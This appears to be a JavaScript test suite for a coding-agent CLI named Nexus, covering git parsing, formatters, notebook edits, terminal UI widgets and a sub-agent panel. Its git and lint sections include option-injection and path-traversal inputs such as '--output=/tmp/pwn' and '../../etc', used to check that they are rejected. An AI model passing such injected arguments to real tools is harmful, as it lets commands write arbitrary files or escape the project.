    const st = GT.parseStatus("## main...origin/main [ahead 2, behind 1]\n M a.js\n?? new.txt\n");
    ok("parseStatus branch+ahead+behind", st.branch === "main" && st.upstream === "origin/main" && st.ahead === 2 && st.behind === 1);
    ok("parseStatus files + not clean", st.files.length === 2 && st.files[0].path === "a.js" && st.clean === false);
    ok("parseStatus clean tree", GT.parseStatus("## main\n").clean === true);
    ok("parseStatus strips 'No commits yet on' prefix to the bare branch", GT.parseStatus("## No commits yet on main\n").branch === "main");
    const lg = GT.parseLog("abc123\x1fAlice\x1f2 days ago\x1fInitial commit\n");
    ok("parseLog one commit", lg.length === 1 && lg[0].author === "Alice" && lg[0].subject === "Initial commit" && lg[0].short === "abc123");
    const bl = GT.parseBlame("abc1234 (Alice 2024-01-02 10:00:00 +0000  12) const x = 1\n");
    ok("parseBlame row", bl[0].commit === "abc1234" && bl[0].author === "Alice" && bl[0].line === 12 && /const x = 1/.test(bl[0].text));
    const br = GT.parseBranches("* main\n  dev\n  remotes/origin/main\n");
    ok("parseBranches current+local+remote", br.current === "main" && br.local.includes("dev") && br.remote.includes("origin/main"));
    const gst = await GT.gitTool({ op: "status" }, "/repo", { run: async () => ({ code: 0, output: "## main\n M a.js\n" }) });
    ok("gitTool status dispatch parses porcelain", gst.op === "status" && gst.status.branch === "main" && gst.status.files.length === 1);
    const gnr = await GT.gitTool({ op: "status" }, "/repo", { run: async () => ({ code: 128, output: "fatal: not a git repository (or any of the parent directories): .git\n" }) });
    ok("gitTool surfaces not-a-repo", /not a git repository/.test(gnr.error));
    const gwrite = await GT.gitTool({ op: "commit" }, "/repo", { run: async () => ({ code: 0, output: "" }) });
    ok("gitTool refuses a write op before running", /read-only/.test(gwrite.error));
    ok("leading-dash ref is rejected (git option injection, e.g. --output)", /invalid git argument/.test(GT.buildGitCommand("show", { ref: "--output=/tmp/pwn" }).error));
    ok("leading-dash ref rejected on diff too", /invalid git argument/.test(GT.buildGitCommand("diff", { ref: "--output=/tmp/pwn" }).error));
    ok("leading-dash path is rejected", /invalid git argument/.test(GT.buildGitCommand("blame", { path: "--x" }).error));
    ok("blame separates the path with -- so it can't be read as an option", /-- 'a\.js'/.test(GT.buildGitCommand("blame", { path: "a.js" }).cmd));
  }

  group("lint_format (auto-fix formatters)");
  {
    const LF = require("../lib/nexus/lint-format");
    eq("detectLangs js+python", LF.detectLangs(["package.json", "pyproject.toml", "README"]).map((l) => l.lang), ["js", "python"]);
    eq("detectLangs none", LF.detectLangs(["README", "LICENSE"]), []);
    const plan = LF.buildPlan(LF.detectLangs(["package.json"]), { fix: true, target: "." });
    ok("buildPlan fix uses --write (first tool only)", plan.length === 1 && /prettier --write/.test(plan[0].cmd));
    const planAll = LF.buildPlan(LF.detectLangs(["package.json"]), { fix: false, target: "'src'", all: true });
    ok("buildPlan check+all includes eslint and scopes target", planAll.length === 2 && planAll.some((p) => /eslint 'src'/.test(p.cmd)) && planAll.every((p) => !/--write/.test(p.cmd)));
    const skipped = await LF.lintFormatTool({}, "/repo", { readdir: () => ["package.json"], run: async () => ({ code: 127, output: "sh: prettier: command not found" }) });
    ok("lintFormatTool skips an uninstalled formatter", skipped.results[0].skipped === "not installed" && /no formatter was installed/.test(skipped.note || ""));
    const ran = await LF.lintFormatTool({}, "/repo", { readdir: () => ["package.json"], run: async () => ({ code: 0, output: "All matched files use Prettier code style!" }) });
    ok("lintFormatTool reports a successful fix run", ran.mode === "fix" && ran.results[0].ok === true && /Ran 1 formatter/.test(ran.summary || ""));
    const none = await LF.lintFormatTool({}, "/repo", { readdir: () => ["README"], run: async () => ({ code: 0, output: "" }) });
    ok("lintFormatTool notes no manifest", none.ran === false && /no recognized project manifest/.test(none.note));
    const esc = await LF.lintFormatTool({ path: "../../etc" }, "/repo", { readdir: () => ["package.json"], run: async () => ({ code: 0, output: "" }) });
    ok("lintFormatTool refuses a path escaping the project root", /escapes the project directory/.test(esc.error || ""));
    const dash = await LF.lintFormatTool({ path: "--write=/tmp/x" }, "/repo", { readdir: () => ["package.json"], run: async () => ({ code: 0, output: "" }) });
    ok("lintFormatTool refuses a leading-dash path (formatter option injection)", /invalid path/.test(dash.error || ""));
    const inside = await LF.lintFormatTool({ path: "src/app.js" }, "/repo", { readdir: () => ["package.json"], run: async () => ({ code: 0, output: "ok" }) });
    ok("lintFormatTool allows an in-root path", !inside.error);
  }

  group("notebook_edit (.ipynb cell ops)");
  {
    const NB = require("../lib/nexus/notebook-edit");
    eq("toSourceLines string->array keeps newlines", NB.toSourceLines("a\nb"), ["a\n", "b"]);
    eq("toSourceLines passes through an array", NB.toSourceLines(["x", "y"]), ["x", "y"]);
    const cell = NB.newCell("code", "print(1)");
    ok("newCell code has outputs + null exec_count", cell.cell_type === "code" && Array.isArray(cell.outputs) && cell.execution_count === null);
    ok("newCell markdown has no outputs", NB.newCell("md", "x").cell_type === "markdown" && NB.newCell("md", "x").outputs === undefined);
    const mk = () => ({ nbformat: 4, cells: [{ cell_type: "code", source: ["x=1"], outputs: [{}], execution_count: 3 }, { cell_type: "markdown", source: ["# title"] }] });
    ok("read summarizes all cells", NB.applyNotebookOp(mk(), { op: "read" }).result.cells.length === 2);
    ok("read one cell by index", NB.applyNotebookOp(mk(), { op: "read", index: 1 }).result.cell.cell_type === "markdown");
    ok("read index out of range errors", /out of range/.test(NB.applyNotebookOp(mk(), { op: "read", index: 9 }).error));
    const edited = NB.applyNotebookOp(mk(), { op: "edit", index: 0, source: "x=2" });
    ok("edit replaces source + clears code outputs", edited.nb.cells[0].source[0] === "x=2" && edited.nb.cells[0].outputs.length === 0 && edited.nb.cells[0].execution_count === null);
    const inserted = NB.applyNotebookOp(mk(), { op: "insert", index: 1, cell_type: "markdown", source: "new" });
    ok("insert adds a cell at index", inserted.nb.cells.length === 3 && inserted.nb.cells[1].cell_type === "markdown");
    const appended = NB.applyNotebookOp(mk(), { op: "append", source: "tail" });
    ok("append adds at the end", appended.nb.cells.length === 3 && appended.result.index === 2);
    const deleted = NB.applyNotebookOp(mk(), { op: "delete", index: 0 });
    ok("delete removes a cell", deleted.nb.cells.length === 1 && deleted.result.removed.index === 0);
    ok("not a notebook errors", /not a valid notebook/.test(NB.applyNotebookOp({}, { op: "read" }).error));
    ok("unknown op errors", /unknown op/.test(NB.applyNotebookOp(mk(), { op: "frob" }).error));
    const ndir = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-nb-"));
    const nfile = path.join(ndir, "nb.ipynb");
    fs.writeFileSync(nfile, JSON.stringify({ nbformat: 4, nbformat_minor: 5, metadata: {}, cells: [{ cell_type: "code", metadata: {}, execution_count: null, outputs: [], source: ["a=1"] }] }));
    const rd = NB.notebookEditTool({ path: nfile, op: "read" }, ndir, (p) => p);
    ok("notebookEditTool reads cells from disk", rd.cellCount === 1 && rd.cells[0].source === "a=1");
    const wr = NB.notebookEditTool({ path: nfile, op: "insert", cell_type: "code", source: "b=2" }, ndir, (p) => p);
    ok("notebookEditTool insert persists to disk", wr.ok === true && JSON.parse(fs.readFileSync(nfile, "utf8")).cells.length === 2);
    ok("notebookEditTool rejects a non-ipynb path", /only edits .ipynb/.test(NB.notebookEditTool({ path: "a.txt", op: "read" }, ndir, (p) => p).error));
    ok("notebookEditTool rejects a path escape", /escapes/.test(NB.notebookEditTool({ path: "../x.ipynb", op: "read" }, ndir, () => { throw new Error("path escapes the project directory"); }).error));
    fs.rmSync(ndir, { recursive: true, force: true });
  }

  {
    const NT2 = require("../lib/nexus/native-tools");
    ok("git_tool/lint_format/notebook_edit are registered schemas", !!NT2.TOOL_SCHEMAS.git_tool && !!NT2.TOOL_SCHEMAS.lint_format && !!NT2.TOOL_SCHEMAS.notebook_edit);
    ok("git_tool requires op", NT2.TOOL_SCHEMAS.git_tool.required[0] === "op");
    ok("notebook_edit requires path", NT2.TOOL_SCHEMAS.notebook_edit.required[0] === "path");
    ok("all three listed by buildToolList", ["git_tool", "lint_format", "notebook_edit"].every((n) => NT2.buildToolList().some((t) => t.name === n)));
  }

  group("tui-format (Claude Code-style tool result lines)");
  { const T = (n, i, c, o) => toolResultView(n, i, c, o).lines.map((l) => l.text);
    eq("Read counts numbered lines", T("Read", {}, "     1\tabc\n     2→def\n"), ["Read 2 lines"]);
    eq("native read_file maps to Read", T("read_file", {}, { content: "a\nb\nc" }), ["Read 3 lines"]);
    const b = toolResultView("Bash", {}, "a\n\nb\nc\nd");
    eq("Bash preview skips blanks, folds the rest", [b.lines.map((l) => l.text), b.more], [["a", "b", "c"], 1]);
    eq("Bash empty output", T("Bash", {}, ""), ["(No content)"]);
    eq("native non-zero exit is an error", T("run_command", {}, { code: 3, output: "nope\n[diagnosis] hint" }), ["Error: Exit code 3", "nope"]);
    eq("tool_use_error unwrapped", T("Edit", {}, "<tool_use_error>String not found</tool_use_error>", { isError: true }), ["Error: String not found"]);
    eq("Grep keeps Found header", T("Grep", {}, "Found 2 files\na\nb"), ["Found 2 files"]);
    eq("Glob with no hits", T("Glob", {}, "No files found"), ["No files found"]);
    eq("TodoWrite checklist states", toolResultView("TodoWrite", { todos: [{ content: "x", status: "completed" }, { content: "y", status: "in_progress" }, { content: "z", status: "pending" }] }, "").lines.map((l) => l.s), ["done", "active", "todo"]);
    eq("interrupted", T("Bash", {}, "", { interrupted: true }), ["Interrupted by user"]);
  }
  group("tui-format (boot header + width fitting)");
  {
    const A = (s) => "\x1b[36m" + s + "\x1b[0m"; // a sample colored span
    // visLen / stripAnsi are ANSI-aware
    eq("visLen ignores color codes", visLen(A("hello")), 5);
    eq("stripAnsi removes escapes", stripAnsi(A("hi")), "hi");
    // fitWidth: no-op when it fits, truncates with ellipsis otherwise
    eq("fitWidth keeps short strings", fitWidth("hello", 10), "hello");
    eq("fitWidth truncates with ellipsis", fitWidth("hello world", 7), "hello …");
    eq("fitWidth max<=0 is empty", fitWidth("hello", 0), "");
    ok("fitWidth counts visible width, not bytes", visLen(fitWidth(A("hello world"), 7)) === 7);
    ok("fitWidth re-closes color when it cuts mid-span", /\x1b\[0m$/.test(fitWidth(A("hello world"), 7)));
    ok("plain input stays escape-free (NO_COLOR safe)", !/\x1b/.test(fitWidth("hello world", 6)));
    ok("fitWidth caps non-BMP width (no overshoot)", visLen(fitWidth("\u{1F600}\u{1F600}\u{1F600}", 4)) <= 4);
    // padRight never truncates
    eq("padRight pads to width", padRight("ab", 5), "ab   ");
    eq("padRight leaves longer strings", padRight("abcdef", 3), "abcdef");
    ok("padRight pads by visible width", visLen(padRight(A("ab"), 5)) === 5);
    // shortenPath: ~ for home, tail-preserving truncation
    eq("shortenPath collapses home to ~", shortenPath("/home/u/p", 20, "/home/u"), "~/p");
    eq("shortenPath keeps whole path when it fits", shortenPath("/a/b", 20, "/x"), "/a/b");
    ok("shortenPath truncates from the left and fits", visLen(shortenPath("/home/u/very/deep/project/dir", 12, "/home/u")) <= 12);
    ok("shortenPath keeps the informative tail", /dir$/.test(shortenPath("/home/u/very/deep/project/dir", 12, "/home/u")));
    // bootHeader: plain (NO_COLOR / non-TTY) output carries no escapes
    const plain = bootHeader({ version: "2.46.0", engine: "claude", engineLabel: "Claude Code", cwd: "/home/u/proj", branch: "main", home: "/home/u", cols: 80 });
    ok("bootHeader returns an array of lines", Array.isArray(plain) && plain.length >= 5);
    ok("bootHeader plain output has no ANSI escapes", plain.every((l) => !/\x1b/.test(l)));
    ok("bootHeader shows the product name", plain.some((l) => /NEXUS/.test(l)));
    ok("bootHeader shows the version", plain.some((l) => /v2\.46\.0/.test(l)));
    ok("bootHeader shows engine + label", plain.some((l) => /engine/.test(l) && /Claude Code/.test(l)));
    ok("bootHeader shows the branch", plain.some((l) => /branch/.test(l) && /main/.test(l)));
    ok("bootHeader shows the cwd with ~ home", plain.some((l) => /~\/proj/.test(l)));
    ok("bootHeader includes the key hints", plain.some((l) => /\/help/.test(l) && /\/model/.test(l) && /Esc/.test(l)));
    // every line fits the terminal width (80 and a narrow 40)
    ok("bootHeader fits 80 cols", plain.every((l) => visLen(l) <= 80));
    const narrow = bootHeader({ version: "2.46.0", engine: "ollama", cwd: "/home/u/very/deep/nested/project/path", branch: "feature/x", home: "/home/u", cols: 40 });
    ok("bootHeader fits a narrow 40 cols", narrow.every((l) => visLen(l) <= 40));
    ok("bootHeader drops the tagline when narrow", narrow.every((l) => !/multi-engine coding agent/.test(l)));
    // colored output via paint hooks still fits and does carry escapes
    const colored = bootHeader({ version: "2.46.0", engine: "claude", cwd: "/home/u/proj", home: "/home/u", cols: 80, paint: { brand: (s) => "\x1b[1m" + s + "\x1b[0m", accent: A, muted: A } });
    ok("bootHeader colored output carries escapes", colored.some((l) => /\x1b/.test(l)));
    ok("bootHeader colored output still fits width", colored.every((l) => visLen(l) <= 80));
    // model row only appears when it differs from the engine
    const noModel = bootHeader({ version: "1", engine: "claude", model: "claude", cwd: "/x", cols: 80 });
    ok("bootHeader hides a redundant model row", !noModel.some((l) => /^\s*model/.test(l)));
    const withModel = bootHeader({ version: "1", engine: "claude", model: "claude-sonnet-4", cwd: "/x", cols: 80 });
    ok("bootHeader shows a distinct model row", withModel.some((l) => /model/.test(l) && /sonnet/.test(l)));
  }

  group("model display names (status bar)");
  eq("claude-opus-5-5 -> Opus 5.5", modelLabel("claude-opus-5-5"), "Opus 5.5");
  eq("claude-sonnet-5-5 -> Sonnet 5.5", modelLabel("claude-sonnet-5-5"), "Sonnet 5.5");
  eq("claude-haiku-5-5 -> Haiku 5.5", modelLabel("claude-haiku-5-5"), "Haiku 5.5");
  eq("fable-5-1 -> Fable 5.1", modelLabel("fable-5-1"), "Fable 5.1");
  eq("version-first id claude-3-5-sonnet-20241022 -> Sonnet 3.5", modelLabel("claude-3-5-sonnet-20241022"), "Sonnet 3.5");
  eq("bare alias opus -> Opus (no invented version)", modelLabel("opus"), "Opus");
  eq("engine name claude -> Claude", modelLabel("claude"), "Claude");
  eq("ollama model passes through", modelLabel("qwen2.5-coder"), "qwen2.5-coder");
  eq("gpt-4o passes through", modelLabel("gpt-4o"), "gpt-4o");
  eq("empty id -> empty", modelLabel(""), "");
  // a reserved-word model id must not resolve an inherited ENG member → native-fn in the header
  ok("modelLabel('constructor') is not a native function string", !/native code/.test(String(modelLabel("constructor"))));
  ok("modelLabel('__proto__') is not a native function string", !/native code/.test(String(modelLabel("__proto__"))));
  eq("effort max -> 'max effort'", effortLabel("max"), "max effort");
  eq("effort low -> 'low effort'", effortLabel("low"), "low effort");
  eq("no effort -> '' (omit, don't invent)", effortLabel(""), "");
  {
    // the status segment the renderer builds: engine · model · effort
    const seg = (engine, model, effort) => { const p = [engine]; const ml = modelLabel(model && model !== engine ? model : ""); if (ml) p.push(ml); const el = effortLabel(effort); if (el) p.push(el); return p.join(" · "); };
    eq("segment with model + effort", seg("claude", "claude-opus-5-5", "max"), "claude · Opus 5.5 · max effort");
    eq("segment without effort omits it", seg("claude", "claude-sonnet-5-5", ""), "claude · Sonnet 5.5");
    eq("segment before a model resolves shows just the engine", seg("claude", "claude", ""), "claude");
  }

  group("explainEngineError (actionable engine/network errors)");
  {
    const has = (s, sub) => ok("'" + sub + "' in: " + s.slice(0, 60), s.toLowerCase().includes(sub));
    ok("local connection refused -> mentions Ollama", /ollama/i.test(explainEngineError("connect ECONNREFUSED 127.0.0.1:11434", { engine: "ollama" })));
    has(explainEngineError("fetch failed", { engine: "ollama" }), "ollama serve");
    has(explainEngineError("fetch failed", { engine: "claude" }), "connection");
    has(explainEngineError("The operation was aborted due to timeout", {}), "timed out");
    has(explainEngineError("429 Too Many Requests", { engine: "claude" }), "rate-limiting");
    has(explainEngineError("401 Unauthorized: invalid api key", { engine: "claude" }), "authentication failed");
    ok("unknown model names the model + /models", (() => { const s = explainEngineError("model not found", { engine: "ollama", model: "qwen2.5-coder" }); return /qwen2\.5-coder/.test(s) && /\/models/.test(s); })());
    has(explainEngineError("you exceeded your current quota", { engine: "openai" }), "billing");
    ok("unrecognised error keeps the raw text + a next step", (() => { const s = explainEngineError("weird kaboom", {}); return /weird kaboom/.test(s) && /\/engine/.test(s); })());
    eq("empty/no message is safe", typeof explainEngineError("", {}), "string");
  }

  group("ask (model-asks-you multiple-choice prompt, Claude-style)");
  {
    const ask = { question: "Which database should the API use?", options: ["PostgreSQL", { label: "SQLite", hint: "zero-config" }, "MySQL"], sel: 0 };
    // ---- normOptions ----
    eq("normalizes strings + objects to {label,hint}", JSON.stringify(normOptions(["a", { label: "b", hint: "h" }])), JSON.stringify([{ label: "a", hint: "" }, { label: "b", hint: "h" }]));
    eq("drops empty labels", normOptions(["", "x", null]).length, 1);
    eq("caps options at 9 (single-digit pick)", normOptions(Array.from({ length: 20 }, (_, i) => "o" + i)).length, 9);
    // ---- askKey: navigation (rows = 3 options + Type + Submit = 5) ----
    eq("down moves focus +1", askKey(ask, "\x1b[B").sel, 1);
    eq("up from 0 wraps to last row (Submit)", askKey(ask, "\x1b[A").sel, 4);
    eq("bare-CSI down (no ESC) also moves", askKey(ask, "[B").sel, 1);
    eq("down tracks pick when landing on an option", askKey(ask, "\x1b[B").pick, 1);
    // ---- askKey: confirm / pick / cancel ----
    ok("enter on an option row confirms it", (() => { const r = askKey({ ...ask, sel: 1 }, "\r"); return r.done && r.index === 1 && r.value.label === "SQLite"; })());
    ok("a digit picks that option immediately", (() => { const r = askKey(ask, "3"); return r.done && r.index === 2 && r.value.label === "MySQL"; })());
    ok("enter on the Submit row confirms the tracked pick", (() => { const r = askKey({ ...ask, sel: 4, pick: 2 }, "\r"); return r.done && r.index === 2 && r.value.label === "MySQL"; })());
    ok("enter on the Type row signals typing (no answer yet)", (() => { const r = askKey({ ...ask, sel: 3 }, "\r"); return r.typing === true && !r.done; })());
    ok("an out-of-range digit is a no-op", (() => { const r = askKey(ask, "7"); return !r.done && !r.cancelled; })());
    ok("esc cancels (user skips)", askKey(ask, "\x1b").cancelled === true);
    ok("ctrl+c cancels", askKey(ask, "\x03").cancelled === true);
    ok("an unrelated key is a no-op that keeps focus", (() => { const r = askKey({ ...ask, sel: 1 }, "x"); return !r.done && !r.cancelled && r.sel === 1; })());
    // ---- renderAsk: layout + content (plain, colors identity) ----
    const rows = renderAsk({ ...ask, sel: 1 }, 60);
    ok("draws the Nexus card (tab header, rail, foot)", rows[0].includes("┏━") && rows[0].includes("◆ nexus asks") && rows.some((r) => r.includes("┃")) && rows[rows.length - 1].includes("┗━"));
    ok("shows the question text", rows.some((r) => r.includes("Which database")));
    ok("keycaps every option", rows.some((r) => /\[1\] PostgreSQL/.test(r)) && rows.some((r) => /\[2\] SQLite/.test(r)) && rows.some((r) => /\[3\] MySQL/.test(r)));
    ok("marks the focused option with ▸", rows.some((r) => r.includes("▸") && r.includes("SQLite")) && !rows.some((r) => r.includes("▸") && r.includes("MySQL")));
    ok("renders a hint when provided", rows.some((r) => r.includes("zero-config")));
    ok("offers a write-my-own-answer row", rows.some((r) => /write my own answer/.test(r)));
    ok("offers a Submit row", rows.some((r) => /Submit/.test(r)));
    ok("has a key-legend footer", rows.some((r) => /enter select/.test(r) && /esc skip/.test(r)));
    ok("the tab header spans exactly the requested width (plain)", rows[0].length === 60);
    ok("no row exceeds the requested width (plain)", rows.every((r) => r.length <= 60));
    ok("allowType:false drops the Type row", !renderAsk({ ...ask, allowType: false }, 60).some((r) => /write my own answer/.test(r)));
    ok("empty options + esc still cancels (no crash)", askKey({ question: "q", options: [], sel: 0 }, "\x1b").cancelled === true);
    ok("renderAsk tolerates no options", Array.isArray(renderAsk({ question: "q", options: [] }, 40)));
  }

  group("ask — multi-select (checkbox) mode");
  {
    // rows = 4 options (0-3) + Type (4) + Submit (5)
    const base = { question: "Pick the test suites to run", options: ["unit", "e2e", "lint", "types"], sel: 0, multi: true, picked: [] };
    ok("space toggles the current row on", (() => { const r = askKey(base, " "); return !r.done && JSON.stringify(r.picked) === JSON.stringify([0]); })());
    ok("space again toggles it back off", (() => { const r = askKey({ ...base, picked: [0] }, " "); return JSON.stringify(r.picked) === JSON.stringify([]); })());
    ok("enter on an option row toggles (does not submit)", (() => { const r = askKey({ ...base, sel: 1, picked: [] }, "\r"); return !r.done && JSON.stringify(r.picked) === JSON.stringify([1]); })());
    ok("a digit toggles that option", (() => { const r = askKey({ ...base, picked: [0] }, "3"); return JSON.stringify(r.picked) === JSON.stringify([0, 2]); })());
    ok("arrows move without changing the picked set", (() => { const r = askKey({ ...base, picked: [1] }, "\x1b[B"); return r.sel === 1 && JSON.stringify(r.picked) === JSON.stringify([1]); })());
    ok("enter on Submit confirms the whole set (sorted)", (() => { const r = askKey({ ...base, sel: 5, picked: [2, 0] }, "\r"); return r.done && JSON.stringify(r.indices) === JSON.stringify([0, 2]) && r.values[0].label === "unit" && r.values[1].label === "lint"; })());
    ok("enter on Submit with nothing picked confirms an empty set", (() => { const r = askKey({ ...base, sel: 5, picked: [] }, "\r"); return r.done && JSON.stringify(r.indices) === JSON.stringify([]); })());
    ok("esc still cancels in multi mode", askKey(base, "\x1b").cancelled === true);
    const rows = renderAsk({ ...base, picked: [1] }, 60);
    ok("renders ■/□ checkboxes", rows.some((r) => r.includes("■")) && rows.some((r) => r.includes("□")));
    ok("multi card is tabbed \"pick any\"", rows[0].includes("pick any"));
    ok("Submit button shows the selected count", rows.some((r) => /\[ Submit · 1 selected \]/.test(r)));
    ok("multi footer mentions space-toggle", rows.some((r) => /space/.test(r) && /toggle/.test(r)));
    ok("no multi box row exceeds width", rows.every((r) => r.length <= 60));
  }

  group("ask — free-text input mode");
  {
    const base = { question: "What should the new command be named?", input: true, text: "" };
    ok("a printable char appends to the field", askKey(base, "s").text === "s");
    ok("builds up the answer char by char", (() => { let a = { ...base }; for (const c of "scan") a = { ...a, text: askKey(a, c).text }; return a.text === "scan"; })());
    ok("backspace removes the last char", askKey({ ...base, text: "scan" }, "\x7f").text === "sca");
    ok("ctrl+u clears the field", askKey({ ...base, text: "scan" }, "\x15").text === "");
    ok("enter submits the typed answer", (() => { const r = askKey({ ...base, text: "scan now" }, "\r"); return r.done && r.value === "scan now"; })());
    ok("esc cancels the input", askKey({ ...base, text: "x" }, "\x1b").cancelled === true);
    ok("a control byte (not backspace) is ignored", askKey({ ...base, text: "ab" }, "\x02").text === "ab");
    ok("a batched multi-char chunk (fast typing) is kept, not dropped", askKey({ ...base, text: "lea" }, "ve the") .text === "leave the");
    ok("a pasted chunk keeps its text; newlines become spaces, no submit", (() => { const r = askKey({ ...base, text: "" }, "first line\nsecond"); return !r.done && r.text === "first line second"; })());
    ok("bracketed-paste markers are stripped", askKey({ ...base, text: "" }, "\x1b[200~pasted\x1b[201~").text === "pasted");
    ok("backspaces inside a chunk apply in order", askKey({ ...base, text: "ab" }, "cd\x7f\x7fx").text === "abx");
    ok("non-ASCII and emoji are kept, backspace removes a whole emoji", (() => { const t = askKey({ ...base, text: "" }, "café 🔒").text; return t === "café 🔒" && askKey({ ...base, text: t }, "\x7f").text === "café "; })());
    ok("arrow keys don't insert text", askKey({ ...base, text: "ab" }, "\x1b[D").text === "ab");
    const empty = renderAsk(base, 50), filled = renderAsk({ ...base, text: "scan" }, 50);
    ok("shows a placeholder when empty", empty.some((r) => /type your answer/.test(r)));
    ok("shows the typed text with a caret", filled.some((r) => r.includes("scan") && r.includes("█")));
    ok("input footer says enter submits", filled.some((r) => /enter submit/.test(r)));
    // ---- the "type a different answer" transition on an option prompt ----
    const optAsk = { question: "Pick one", options: ["A", "B"], sel: 2 }; // sel 2 = Type row (0,1 opts, 2 type, 3 submit)
    ok("enter on the Type row asks the host to switch to typing", askKey(optAsk, "\r").typing === true);
    ok("once in type mode, a submitted answer is flagged typed", (() => { const r = askKey({ question: "Pick one", options: ["A", "B"], input: true, typed: true, text: "custom" }, "\r"); return r.done && r.value === "custom" && r.typed === true; })());
    ok("a pure free-text prompt is NOT flagged typed", (() => { const r = askKey({ question: "name?", input: true, text: "x" }, "\r"); return r.done && r.value === "x" && !r.typed; })());
  }

  group("agents panel (live sub-agent list under the prompt bar)");
  {
    const A = require("../lib/cli/agents");
    const now = 100000;
    const agents = [
      { id: "ag0", task: "add unit tests for the parser", status: "ok", start: now - 83000, end: now - 20000, result: "Added 12 tests; all pass." },
      { id: "ag1", task: "write the API docs", status: "run", start: now - 5000 },
      { id: "ag2", task: "fix the lint errors", status: "fail", start: now - 60000, end: now - 10000, result: "could not resolve 3 warnings" },
    ];
    // ---- fmtDur ----
    eq("fmtDur seconds", A.fmtDur(5000), "5s");
    eq("fmtDur minutes+seconds", A.fmtDur(83000), "1m23s");
    eq("fmtDur hours+minutes", A.fmtDur((2 * 3600 + 4 * 60) * 1000), "2h04m");
    eq("fmtDur clamps negatives to 0s", A.fmtDur(-5), "0s");
    // ---- elapsed uses end when finished, now while running ----
    eq("elapsed of a finished agent uses its end", A.elapsed(agents[0], now), 63000);
    eq("elapsed of a running agent uses now", A.elapsed(agents[1], now), 5000);
    // ---- panelRows ----
    const idle = A.panelRows(agents, { now, sel: -1, width: 70 });
    ok("empty registry renders nothing", A.panelRows([], { now, width: 70 }).length === 0);
    ok("header summarises running + done counts", /1 running/.test(idle[0]) && /2 done/.test(idle[0]));
    ok("idle header hints how to select", /to select/.test(idle[0]));
    ok("lists each agent's task", idle.some((r) => /add unit tests/.test(r)) && idle.some((r) => /write the API docs/.test(r)) && idle.some((r) => /fix the lint errors/.test(r)));
    ok("shows elapsed per agent", idle.some((r) => /1m03s/.test(r)) && idle.some((r) => /5s/.test(r)));
    ok("idle panel shows no ▶ cursor", !idle.slice(1).some((r) => r.includes("▶")));
    const foc = A.panelRows(agents, { now, sel: 1, width: 70 });
    ok("focused header hints open/stop/back", /enter open/.test(foc[0]) && /stop/.test(foc[0]) && /esc back/.test(foc[0]));
    ok("lanes are drawn as a tree (├─ … └─)", idle.some((r) => r.includes("├─")) && idle[idle.length - 1].includes("└─"));
    ok("finished lanes show a status badge", idle.some((r) => /done/.test(r) && /add unit tests/.test(r)) && idle.some((r) => /failed/.test(r)));
    ok("status column is aligned across lanes", (() => { const ends = idle.slice(1).map((r) => r.length); return ends.every((n) => n === ends[0]); })());
    ok("no lane exceeds the width", foc.every((r) => r.length <= 70));
    ok("a running lane animates (spinner + meter change over time)", A.panelRows(agents, { now, width: 70 })[2] !== A.panelRows(agents, { now: now + 300, width: 70 })[2]);
    eq("meter lights two adjacent cells", (A.meter(0).match(/▰/g) || []).length, 2);
    ok("meter bounces back (never runs off the end)", Array.from({ length: 40 }, (_, k) => A.meter(k * 140)).every((m) => m.length === 5 && /▰▰/.test(m)));
    ok("focused lane carries the ▶ cursor on the selected task", foc.some((r) => r.includes("▶") && /write the API docs/.test(r)));
    ok("long task is truncated with an ellipsis at a narrow width", A.panelRows([{ task: "x".repeat(200), status: "run", start: now }], { now, width: 40 }).some((r) => r.includes("…")));
    const many = Array.from({ length: 9 }, (_, i) => ({ id: "a" + i, task: "task " + i, status: "run", start: now }));
    const win = A.panelRows(many, { now, sel: -1, width: 70, max: 4 });
    ok("caps the visible rows and notes the overflow", win.filter((r) => /task \d/.test(r)).length === 4 && win.some((r) => /\+5 more/.test(r)));
    ok("unfocused window shows the most-recent agents", win.some((r) => /task 8/.test(r)) && !win.some((r) => /task 0\b/.test(r)));
    // ---- windowStart ----
    eq("no window when it fits", A.windowStart(3, 1, 5), 0);
    eq("unfocused window pins to the tail", A.windowStart(9, -1, 4), 5);
    eq("focused window follows the selection", A.windowStart(9, 7, 4), 5);
    // ---- panelKey reducer ----
    eq("down moves selection +1", A.panelKey({ sel: 0 }, "\x1b[B", 3).sel, 1);
    eq("down clamps at the last agent", A.panelKey({ sel: 2 }, "\x1b[B", 3).sel, 2);
    eq("up moves selection -1", A.panelKey({ sel: 2 }, "\x1b[A", 3).sel, 1);
    ok("up off the top row leaves the panel", A.panelKey({ sel: 0 }, "\x1b[A", 3).leave === true);
    ok("enter opens the selected agent", A.panelKey({ sel: 1 }, "\r", 3).open === 1);
    ok("a digit opens that agent directly", A.panelKey({ sel: 0 }, "2", 3).open === 1);
    ok("an out-of-range digit keeps focus (no open)", (() => { const r = A.panelKey({ sel: 0 }, "9", 3); return r.open == null && r.leave == null; })());
    ok("s stops the selected agent", A.panelKey({ sel: 2 }, "s", 3).stop === 2);
    ok("x clears the finished agents", A.panelKey({ sel: 0 }, "x", 3).clear === true);
    ok("esc leaves the panel", A.panelKey({ sel: 1 }, "\x1b", 3).leave === true);
    ok("an empty registry always leaves", A.panelKey({ sel: 0 }, "\x1b[B", 0).leave === true);
    ok("an unrelated key keeps focus", (() => { const r = A.panelKey({ sel: 1 }, "z", 3); return r.sel === 1 && r.open == null && r.stop == null; })());
    // ---- viewRows (transcript overlay) ----
    const vr = A.viewRows(agents[0], 70, 24, 0, null, now);
    ok("view shows the task", vr.some((r) => /add unit tests/.test(r)));
    ok("view shows a done badge + elapsed", vr.some((r) => /done/.test(r)) && vr.some((r) => /1m03s/.test(r)));
    ok("view shows the agent's result text", vr.some((r) => /Added 12 tests/.test(r)));
    ok("view of a running agent with no output says running", A.viewRows(agents[1], 70, 24, 0, null, now).some((r) => /running/.test(r)));
    ok("running view offers a stop key; finished view does not", A.viewRows(agents[1], 70, 24, 0, null, now).some((r) => /s stop/.test(r)) && !A.viewRows(agents[0], 70, 24, 0, null, now).some((r) => /s stop/.test(r)));
    const vb = A.viewBar(agents[0], 0, 3, 80, null, now), vbr = A.viewBar(agents[1], 1, 3, 80, null, now);
    ok("agent view bar: position, status and task in the header", /agent 1\/3/.test(vb[1]) && /done/.test(vb[1]));
    ok("agent view bar: stop key only while running, prev/next with several agents", /s stop/.test(vbr[2]) && !/s stop/.test(vb[2]) && /prev\/next/.test(vb[2]));
